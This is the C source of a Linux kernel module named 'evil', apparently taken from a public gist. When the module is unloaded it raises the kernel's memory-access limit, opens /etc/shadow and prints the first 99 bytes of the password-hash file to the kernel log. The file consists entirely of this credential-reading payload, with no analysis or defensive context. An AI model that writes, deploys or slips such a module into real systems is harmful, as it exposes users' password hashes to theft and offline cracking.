// From: https://gist.github.com/sirdarckcat/fe8ce94ef25de375d13b7681d851b7b4
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
// We want to read files
#include <linux/fs.h>
#include <asm/segment.h>
#include <linux/uaccess.h>
#include <linux/buffer_head.h>

static int __init evil_init(void)
{
  printk(KERN_INFO "[EVIL] loaded.\n");
  return 0;
}

static void __exit evil_exit(void)
{
  char shadow[100];
  mm_segment_t oldfs;
  unsigned long long offset = 0;
  struct file *filp = NULL;
  oldfs = get_fs();
  set_fs(get_ds());
  filp = filp_open("/etc/shadow", 0, 0);
  if (IS_ERR(filp)) {
    printk(KERN_INFO "[EVIL] Error: %ld\n", PTR_ERR(filp));
  } else {
    kernel_read(filp, shadow, 99, &offset);
    filp_close(filp, NULL);
    shadow[99]=0;
    printk(KERN_INFO "[EVIL] /etc/shadow %s\n", shadow);
  }
  set_fs(oldfs);
}

module_init(evil_init);
module_exit(evil_exit);

